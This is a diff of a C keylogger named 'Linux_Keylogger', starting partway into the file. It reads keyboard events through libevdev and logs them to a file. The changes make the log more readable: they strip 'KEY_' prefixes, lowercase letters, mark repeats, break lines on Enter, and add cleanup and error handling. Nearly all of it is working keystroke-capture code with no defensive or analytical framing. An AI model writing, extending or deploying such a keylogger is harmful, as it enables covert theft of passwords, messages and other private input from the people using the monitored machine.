@@ -10,21 +10,27 @@
 #include <sys/stat.h>
 #include <sys/types.h>
 #include<libevdev-1.0/libevdev/libevdev.h>
+#include<ctype.h>
 
 
 FILE *file;
 struct libevdev *dev;
+char *str;
 
 
 void cleanup(){
-	//printf("\nAccesses cleanup after crtl+C\n");
 	if (file != NULL){
-		fprintf(file, "Cleanup() called Linux_Keylogger was Exited");
+		fprintf(file, "\n");
+		fprintf(file, "\nCleanup() called Linux_Keylogger was Exited");
 		fclose(file);
 	}
 
 	if (dev != NULL){
 		libevdev_free(dev);
+	}
+
+	if (str != NULL){
+		free(str);
 	}
 }
 
@@ -33,9 +39,17 @@ void sigintHandler(int signum){
 }
 
 
+char* updateString(char *str){
+	char *position = strstr(str,"KEY_"); 
+	
+	if (position != NULL){
+		memmove(position, position + 4, strlen(position + 4) +1);
+		
+	}
 
+	return str;
 
-
+}
 
 
 
@@ -44,7 +58,6 @@ int main(int argc, char* argv[]){
 	atexit(cleanup); // Register cleanup function
 	signal(SIGINT, sigintHandler); //Register SIGINT handler
 
-        //struct libevdev *dev = NULL;
         dev = NULL;
 	int fd;
         int rc =1;       
@@ -71,7 +84,7 @@ int main(int argc, char* argv[]){
         fprintf(file, "Input device ID: bus %#x vendor %#x product %#x\n", libevdev_get_id_bustype(dev), libevdev_get_id_vendor(dev), libevdev_get_id_product(dev));
 
 
-        //in the future maybe turn the check into a do while so that if the check fails instead of exiting, restart with the next event file
+        //in the future turn the check into a do while so that if the check fails instead of exiting, restart with the next event file
 
 
         //currently checks to see if the device is a keyboard if not exits the program
@@ -81,27 +94,57 @@ int main(int argc, char* argv[]){
                 printf("This device does not support the space bar key");
                 exit(EXIT_FAILURE);
         }
+	const char *tempstr;
+	str = malloc(sizeof(char) * 256);
 
+	fprintf(file,"\n");
 
+	int repeat = 0;
+	
         do {
-                struct input_event ev;
+		struct input_event ev;
                 rc = libevdev_next_event(dev, LIBEVDEV_READ_FLAG_NORMAL, &ev);
 
                 if (rc  == 0)
-		{
-			fprintf(file, "Event: %s %d %d\n", libevdev_event_code_get_name(ev.type, ev.code), ev.code , ev.value);
-			//fprintf(file, "Event: %s\n", libevdev_event_code_get_name(ev.type, ev.code));
-                       	//fprintf(file, "Event: %s %s %d\n", libevdev_event_type_get_name(ev.type), libevdev_event_code_get_name(ev.type, ev.code), ev.value);
-			//printf("%c", libevdev_event_code_get_name(ev.type, ev.code));
+		{		
+
+			tempstr = libevdev_event_code_get_name(ev.type, ev.code);
 			
+			strncpy(str, tempstr, 255);
+			str[255]= '\0'; //ensures the string is null terminated
+
+
+			str = updateString(str);
 
 			
+			if (strlen(str) < 2){
+				*str = tolower(*str); 
+			}
+			
+			if (ev.value == 2 && repeat == 0){
+				
+				fprintf(file, "  (A repeat event of the last input has occured!)  ");
 
+				repeat = 1;
 
+			}else if (strstr(str, "_") == NULL && ev.value ==  1){ 
+				if (strstr(str, "ENTER")){
+					fprintf(file, "%s \n", str);
+				}else{
+					fprintf(file, "%s ", str);
+				}
 
-                }
-        }while (rc == 1 || rc == 0 || rc == -EAGAIN);
+				repeat = 0;
+			}
 
-        return 0;
+                }else if (rc == -EAGAIN){
+			continue;
+		}else{
+			fprintf(stderr, "Failed to read event: %s\n", strerror(-rc));
+			break;
+		}	
+        }while(1);
+
+   	return 0;
 }
 
